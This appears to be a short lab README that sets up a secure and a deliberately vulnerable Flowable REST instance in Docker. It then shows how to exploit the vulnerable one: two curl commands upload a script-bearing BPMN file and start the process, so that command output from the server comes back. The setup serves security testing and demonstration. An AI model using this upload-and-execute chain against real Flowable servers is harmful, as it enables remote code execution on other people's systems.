# Setup secure and vulnerable Flowable instances
```bash
docker compose up
```
test secure instance with this URL: http://localhost:8080/flowable-rest/service/repository/deployments
test vulnerable instance with this URL: http://localhost:8081/flowable-rest/service/repository/deployments

# How to Exploit the Exposed UI (on Vulnerable Instance)
```bash
curl -X POST \
    'http://localhost:8081/flowable-rest/service/repository/deployments' \
    -H 'Content-Type: multipart/form-data' \
    -F 'file=@jsScript.bpmn'

curl -X POST \
    'http://localhost:8081/flowable-rest/service/runtime/process-instances' \
    -H 'Content-Type: application/json' \
    -d '{
    "processDefinitionKey": "jsScriptProcess"
    }'
```
Look for the `"variables":[{"name":"commandOutput","type":"string","value":"` at output of the last command.